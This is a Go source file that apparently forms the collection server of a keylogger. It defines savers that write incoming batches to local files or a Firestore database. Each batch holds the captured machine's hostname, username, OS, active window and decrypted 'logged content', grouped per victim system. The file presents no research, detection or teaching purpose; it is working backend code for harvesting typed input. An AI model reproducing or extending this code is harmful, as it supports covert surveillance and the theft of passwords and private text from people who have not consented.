package main

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
	"time"

	"cloud.google.com/go/firestore"
)

// creates an interface for saving logs, can implement using firebase or local files
type LogSaver interface {
	Save(payload LogPayload, decryptedContent string) error
}

// FileSaver implements LogSaver interface for saving logs to local files
type FileSaver struct {
	LogDirectory string
}

func (fs *FileSaver) Save(payload LogPayload, decryptedContent string) error {
	logDir := filepath.Join(fs.LogDirectory, payload.SystemInfo.SystemID)
	if err := os.MkdirAll(logDir, 0755); err != nil {
		return fmt.Errorf("FileSaver: failed to create log directory '%s': %w", logDir, err)
	}

	logFileName := fmt.Sprintf("%s_%s_%s.log",
		payload.SystemInfo.Hostname,
		time.Now().Format("2006-01-02"),
		payload.SystemInfo.SystemID[:8])

	logFilePath := filepath.Join(logDir, logFileName)
	logEntry := fmt.Sprintf(
		"----- Log Batch Start (UTC: %s, Duration: %.2fs) -----\n"+
			"System ID: %s\nHostname: %s\nOS: %s (%s)\nUsername: %s\nActive Window: %s\n"+
			"Logged Content:\n%s\n"+
			"----- Log Batch End (Server UTC: %s) -----\n\n",
		payload.LogStartTimeUTC,
		payload.LogDurationSeconds,
		payload.SystemInfo.SystemID,
		payload.SystemInfo.Hostname,
		payload.SystemInfo.OS,
		payload.SystemInfo.OSRelease,
		payload.SystemInfo.Username,
		payload.SystemInfo.ActiveWindow,
		decryptedContent,
		time.Now().Format("2006-01-02 15:04:05"),
	)

	f, err := os.OpenFile(logFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return fmt.Errorf("FileSaver: failed to open log file '%s': %w", logFilePath, err)
	}
	defer f.Close()

	if _, err := f.WriteString(logEntry); err != nil {
		return fmt.Errorf("FileSaver: failed to write to log file '%s': %w", logFilePath, err)
	}

	log.Printf("FileSaver: Log batch from system %s. Stored to %s", payload.SystemInfo.SystemID, logFilePath)
	return nil
}

// FirebaseSaver implements LogSaver interface for saving logs to Firebase
type FirebaseSaver struct{}

func (fs *FirebaseSaver) Save(payload LogPayload, decryptedContent string) error {
	if firestoreClient == nil {
		return fmt.Errorf("FirebaseSaver: Firestore client not initialized")
	}

	systemID := payload.SystemInfo.SystemID
	systemsCollection := firestoreClient.Collection("systems")
	systemDocRef := systemsCollection.Doc(systemID)

	systemData := FirebaseSystemInfo{
		SystemID:  systemID,
		Hostname:  payload.SystemInfo.Hostname,
		OS:        payload.SystemInfo.OS,
		OSRelease: payload.SystemInfo.OSRelease,
		Username:  payload.SystemInfo.Username,
	}

	// Use Set with firestore.MergeAll to update existing or create new document
	_, err := systemDocRef.Set(ctx, systemData, firestore.MergeAll)
	if err != nil {
		return fmt.Errorf("FirebaseSaver: failed to save/update system info for %s: %w", systemID, err)
	}
	log.Printf("FirebaseSaver: System info for %s saved/updated in 'systems' collection.", systemID)

	entry := LogEntry{
		LogStartTimeUTC:    payload.LogStartTimeUTC,
		LogDurationSeconds: payload.LogDurationSeconds,
		LoggedContent:      decryptedContent,
		ActiveWindow:       payload.SystemInfo.ActiveWindow,
		ServerTimestamp:    time.Now(),
	}

	// add the log entry to the "batches" subcollection under the specific system's document
	_, _, err = systemDocRef.Collection("batches").Add(ctx, entry)
	if err != nil {
		return fmt.Errorf("FirebaseSaver: failed to add log document to Firestore for system %s: %w", systemID, err)
	}

	log.Printf("FirebaseSaver: Log batch from system %s saved to Firestore subcollection.", systemID)
	return nil
}
